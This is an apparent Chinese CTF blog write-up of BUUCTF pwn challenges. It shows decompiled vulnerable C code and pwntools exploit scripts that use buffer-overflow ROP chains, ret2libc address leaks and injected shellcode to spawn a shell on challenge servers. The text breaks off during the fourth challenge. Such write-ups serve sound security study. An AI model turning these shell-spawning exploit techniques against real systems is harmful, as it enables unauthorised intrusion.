<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>BUU_PWN刷题_0x10-0x1F - Ghostasky&#39;s Blog</title><meta name="author" content="">
<meta name="author-link" content="">
<meta name="description" content="" /><meta name="keywords" content='PWN' /><meta itemprop="name" content="BUU_PWN刷题_0x10-0x1F">
<meta itemprop="description" content=""><meta itemprop="datePublished" content="2021-06-01T00:00:00+00:00" />
<meta itemprop="dateModified" content="2021-06-01T00:00:00+00:00" />
<meta itemprop="wordCount" content="5447">
<meta itemprop="keywords" content="PWN," /><meta property="og:title" content="BUU_PWN刷题_0x10-0x1F" />
<meta property="og:description" content="" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://ghostasky.github.io/posts/buu-pwn-0x10-0x1f/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-06-01T00:00:00+00:00" />
<meta property="article:modified_time" content="2021-06-01T00:00:00+00:00" />
<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="BUU_PWN刷题_0x10-0x1F"/>
<meta name="twitter:description" content=""/>
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://ghostasky.github.io/posts/buu-pwn-0x10-0x1f/" /><link rel="prev" href="http://ghostasky.github.io/posts/buu-web-0x10-0x1f/" /><link rel="next" href="http://ghostasky.github.io/posts/buu-pwn-0x01-0x0f/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "BUU_PWN刷题_0x10-0x1F",
    "inLanguage": "zh-CN",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/ghostasky.github.io\/posts\/buu-pwn-0x10-0x1f\/"
    },"genre": "posts","keywords": "PWN","wordcount":  5447 ,
    "url": "http:\/\/ghostasky.github.io\/posts\/buu-pwn-0x10-0x1f\/","datePublished": "2021-06-01T00:00:00+00:00","dateModified": "2021-06-01T00:00:00+00:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "作者"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              >文章</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              >分类</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              >标签</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              >关于</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="/images/fixit.png" data-title="/images/fixit.png" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                >文章</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                >分类</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                >标签</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                >关于</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>BUU_PWN刷题_0x10-0x1F</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
      Anonymous</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/technology/" class="post-category" title="分类 - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Technology</a></span></div><div class="post-meta-line"><span title="发布于 2021-06-01 00:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2021-06-01">2021-06-01</time></span>&nbsp;<span title="5447 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 5500 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 11 分钟</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>目录</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#0x10harekazectf2019baby_rop">0x10.[HarekazeCTF2019]baby_rop</a></li>
        <li><a href="#0x11jarvisoj_level2_x64">0x11.jarvisoj_level2_x64</a></li>
        <li><a href="#0x12ciscn_2019_n_5">0x12.ciscn_2019_n_5</a></li>
        <li><a href="#0x13ciscn_2019_ne_5">0x13.ciscn_2019_ne_5</a></li>
        <li><a href="#0x14铁人三项第五赛区_2018_rop">0x14.铁人三项(第五赛区)_2018_rop</a></li>
        <li><a href="#0x14others_shellcode">0x14.others_shellcode</a></li>
        <li><a href="#0x15bjdctf_2020_babyrop">0x15.bjdctf_2020_babyrop</a></li>
        <li><a href="#0x16babyheap_0ctf_2017">0x16.babyheap_0ctf_2017</a></li>
        <li><a href="#0x17pwn2_sctf_2016">0x17.pwn2_sctf_2016</a></li>
        <li><a href="#0x18ciscn_2019_s_3">0x18.ciscn_2019_s_3</a></li>
        <li><a href="#0x19harekazectf2019baby_rop2">0x19.[HarekazeCTF2019]baby_rop2</a></li>
        <li><a href="#0x1ajarvisoj_fm">0x1A.jarvisoj_fm</a></li>
        <li><a href="#0x1bjarvisoj_tell_me_something">0x1B.jarvisoj_tell_me_something</a></li>
        <li><a href="#0x1cjarvisoj_level4">0x1C.jarvisoj_level4</a></li>
        <li><a href="#0x1djarvisoj_level3">0x1D.jarvisoj_level3</a></li>
        <li><a href="#0x1eblack-watch-入群题pwn">0x1E.[Black Watch 入群题]PWN</a></li>
        <li><a href="#0x1fbjdctf_2020_babystack2">0x1F.bjdctf_2020_babystack2</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><p>[TOC]</p>
<h3 id="0x10harekazectf2019baby_rop" class="heading-element">
  <a href="#0x10harekazectf2019baby_rop" class="heading-mark"></a>0x10.[HarekazeCTF2019]baby_rop</h3><p>没后门函数：</p>
<div class="highlight" id="id-1"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">v4</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-10h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">system</span><span class="p">(</span><span class="s">&#34;echo -n </span><span class="se">\&#34;</span><span class="s">What&#39;s your name? </span><span class="se">\&#34;</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Welcome to the Pwn World, %s!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><div class="highlight" id="id-2"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">##io = process(&#34;./babyrop&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node3.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">28280</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./babyrop&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">sys_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&#34;system&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_ret</span> <span class="o">=</span><span class="mh">0x0400683</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x0601048</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x18</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">sys_plt</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h3 id="0x11jarvisoj_level2_x64" class="heading-element">
  <a href="#0x11jarvisoj_level2_x64" class="heading-mark"></a>0x11.jarvisoj_level2_x64</h3><div class="highlight" id="id-3"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">ssize_t</span> <span class="nf">vulnerable_function</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-80h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">system</span><span class="p">(</span><span class="s">&#34;echo Input:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x200uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>有/bin/sh字符串，没啥写的。</p>
<div class="highlight" id="id-4"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="c1">##io = process(&#34;./level2_x64&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node3.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">28783</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./level2_x64&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">sys_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x0004006b3</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x00600A90</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="mh">0x88</span><span class="o">*</span><span class="s1">&#39;a&#39;</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">sys_plt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h3 id="0x12ciscn_2019_n_5" class="heading-element">
  <a href="#0x12ciscn_2019_n_5" class="heading-mark"></a>0x12.ciscn_2019_n_5</h3><p>啥都没开，刺激。</p>
<pre tabindex="0"><code>yutao@pwnbaby:~/Desktop$ checksec ciscn_2019_n_5
[*] &#39;/home/yutao/Desktop/ciscn_2019_n_5&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments</code></pre><p>可以ret2libc或者ret2shellcode</p>
<p>这里要加架构名称，不然报错。</p>
<div class="highlight" id="id-6"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">##io = process(&#34;./ciscn_2019_n_5&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node3.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">28410</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload_add</span> <span class="o">=</span> <span class="mh">0x0601080</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span> 
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x28</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">payload_add</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><p>注意Ubuntu18的话要加一个ret栈对齐</p>
<div class="highlight" id="id-7"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./ciscn_2019_n_5&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./ciscn_2019_n_5&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">##io = remote(&#39;node3.buuoj.cn&#39;,28410)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;123&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x00400713</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="mh">0x400636</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x28</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">,</span><span class="n">puts_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sys_addr</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x4004c9</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x28</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h3 id="0x13ciscn_2019_ne_5" class="heading-element">
  <a href="#0x13ciscn_2019_ne_5" class="heading-mark"></a>0x13.ciscn_2019_ne_5</h3><div class="highlight" id="id-8"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [esp+0h] [ebp-100h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">src</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span> <span class="c1">// [esp+4h] [ebp-FCh] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v6</span><span class="p">[</span><span class="mi">124</span><span class="p">];</span> <span class="c1">// [esp+8h] [ebp-F8h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">s1</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span> <span class="c1">// [esp+84h] [ebp-7Ch] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v8</span><span class="p">[</span><span class="mi">96</span><span class="p">];</span> <span class="c1">// [esp+88h] [ebp-78h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="o">*</span><span class="n">v9</span><span class="p">;</span> <span class="c1">// [esp+F4h] [ebp-Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v9</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">argc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">s1</span> <span class="o">=</span> <span class="mi">48</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">v8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">v8</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">src</span> <span class="o">=</span> <span class="mi">48</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">v6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">v6</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Welcome to use LFS.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Please input admin password:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%100s&#34;</span><span class="p">,</span> <span class="n">s1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nf">strcmp</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="s">&#34;administrator&#34;</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Password Error!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Welcome!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Input your operation:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;1.Add a log.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;2.Display all logs.&#34;</span><span class="p">);</span>
